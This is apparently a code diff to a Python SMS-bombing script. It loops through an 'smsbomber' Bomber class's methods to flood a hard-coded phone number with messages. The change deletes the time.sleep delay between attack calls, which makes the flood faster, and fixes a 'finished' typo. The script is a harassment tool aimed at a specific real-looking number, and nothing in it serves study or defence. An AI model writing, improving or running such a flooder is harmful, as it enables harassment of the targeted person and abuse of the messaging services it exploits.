@@ -11,7 +11,7 @@ def attack1(phone):
             try:
                 getattr(smsbomber.Bomber(phone), i)
                 print('%s has excuted!' % i)
-                time.sleep(times)
+
             except:
                 print('%s meet some problems!' % i)
                 continue
@@ -20,4 +20,4 @@ def attack1(phone):
 
 if __name__=='__main__':
     attack1("13377224828")
-    print("inished！")
+    print("finished！")
